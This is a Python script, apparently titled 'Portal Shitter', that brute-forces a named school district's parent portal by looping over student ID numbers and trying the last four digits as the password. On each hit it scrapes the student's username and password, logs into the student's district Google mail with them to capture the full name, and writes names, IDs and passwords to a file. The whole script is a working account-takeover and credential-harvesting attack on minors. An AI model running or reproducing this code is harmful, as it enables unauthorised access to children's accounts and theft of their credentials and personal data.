import time
import mechanize
from bs4 import BeautifulSoup
from colored import fg, attr
from playwright.sync_api import sync_playwright

class settings():
    getname = False
    getschool = False
    getcombo = False
    getid = True # Forced, must never be disabled

# Declare vars
domain = "https://dashboard.okaloosaschools.com"
br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
green = fg('#00FF00')
red = fg('#FF0000')
orange = fg('#FFFF00')
res = attr('reset')

# Questions
print("=== Portal Shitter ===\nA settings.config was not detected, please specify settings manually\n\nSettings =============")
if input("Scrape name? ") == "y":
    settings.getname = True
if input("Save school? ") == "y":
    settings.getschool = True
if input("Save combo? ") == "y":
    settings.getcombo = True
if input("Save settings? ") == "y":
    f = open("settings.config", "w")
    f.write(f"getname = {str(settings.getname)}\ngetschool = {str(settings.getschool)}\ngetcombo{str(settings.getcombo)}")
    f.close()

# Set user class
class user:
    studentid = "N/A"
    username = "N/A"
    password = "N/A"
    birthmonth = "N/A"
    school = "N/A"
    fullname = "N/A"


# Set smurf class
class smurf:
    id = "N/A"
    full = "N/A"
    randid = "N/A"


# Main function
for x in range(4624021143, 4699999999):
    br.open(domain + "/parentportal/PP000.pgm")
    br.select_form(nr=0)
    user.studentid = str(x)
    br.form['wrkuser'] = user.studentid
    br.form['wrkpasswd'] = user.studentid[-4:]
    print("[RUN] Checking %s..." % user.studentid)
    response = br.submit()
    try:
        br.select_form(nr=0)
    except mechanize._mechanize.FormNotFoundError:
        start = time.time()
        soup = BeautifulSoup(br.response().read(), 'lxml')
        redirect = str(soup)[63:146]
        smurf.full = domain + redirect
        br.open(smurf.full)
        soup = BeautifulSoup(br.response().read(), 'lxml')

        # Get username/password
        tempCombo = []
        for span in soup.select("td span"):
            tempCombo.append(span.text)
        user.username = tempCombo[0]
        user.password = tempCombo[1]
        smurf.id = smurf.full[69:101]
        smurf.randid = smurf.full[-9:]
        finalSmurf = domain + "/parentportal/PP013.pgm?SmurfId= " + \
            smurf.id + "&wrkcycle=02&wrkgrd=11&rcyear=2022"

        # Get real name
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=False)
            start = time.time()
            page = browser.new_page()
            page.goto("https://mail.google.com")
            print("Google login")
            html = page.inner_html("#content")
            soup = BeautifulSoup(html, "html.parser")
            print(soup)
            page.fill('xpath=//*[@id="identifierId"]', f"{user.username.lower()}@student.okaloosaschools.com")
            print("Google done")
            page.click('xpath=//*[@id="identifierNext"]/div/button/div[3]')
            page.fill('xpath=//*[@id="userNameInput"]', user.username)
            page.fill('//*[@id="passwordInput"]', user.password)
            page.click('xpath=//*[@id="submitButton"]')
            user.fullname = page.inner_html('xpath=/html/body/div[3]/div/div[2]')

        # Write to file
        f = open("./assets/matches.txt", "a")
        f.write(f"Name: {user.fullname}\nID: {user.studentid}\nUsername: {user.username}\nPassword: {user.password}")
        f.close()

        # Time
        end = time.time()
        delta = str(round(end - start, 2))
        print("[RUN] " + green + "Found " + user.fullname + "..." + res)
        print(" L " + green + "Scraped " + user.studentid + "..." + res)
        print(" L " + green + "Scraped " + user.username + "..." + res)
        print(" L " + green + "Scraped " + user.password + "..." + res)
        print(" L " + green + "Scraped " + smurf.id + "..." + res)
        print(" L " + orange + "Took " + delta + "s to process match..." + res)
        break
